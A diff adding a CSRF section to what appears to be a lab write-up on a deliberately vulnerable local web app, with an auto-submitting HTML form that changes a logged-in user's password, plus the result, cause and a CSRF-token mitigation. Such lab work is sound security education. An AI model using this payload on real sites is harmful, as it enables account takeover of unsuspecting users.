@@ -166,3 +166,43 @@ At the High security level, the application performs stricter input validation a
 
 ### Explanation of mitigation:
 The application restricts the input and filters dangerous characters before executing the system command. This prevents attackers from injecting additional commands into the system call.
+
+## Cross-Site Request Forgery (CSRF)
+
+### Security Level:
+Low 🟡
+
+### Payload:
+```html
+<html>
+<body>
+
+<form action="http://localhost:8080/vulnerabilities/csrf/" method="GET">
+  <input type="hidden" name="password_new" value="hacked123">
+  <input type="hidden" name="password_conf" value="hacked123">
+  <input type="hidden" name="Change" value="Change">
+</form>
+
+<script>
+document.forms[0].submit();
+</script>
+
+</body>
+</html>
+```
+
+##### Payload Source:
+Hackviser – CSRF Testing Guide  
+https://hackviser.com/tactics/pentesting/web/csrf
+
+### Result:
+The malicious HTML page automatically submitted the request and the password was changed without the user pressing the **Change** button.
+
+### Screenshot:
+![CSRF Low](screenshots/csrf-low.png)
+
+### Explanation of why it worked:
+At the Low security level, the application does not verify where the request originated from. Since the victim is already authenticated, the browser automatically sends the session cookie with the request, allowing the password change to occur.
+
+### Explanation of mitigation:
+Applications should implement CSRF tokens and verify them on the server side to ensure that requests originate from legitimate forms.
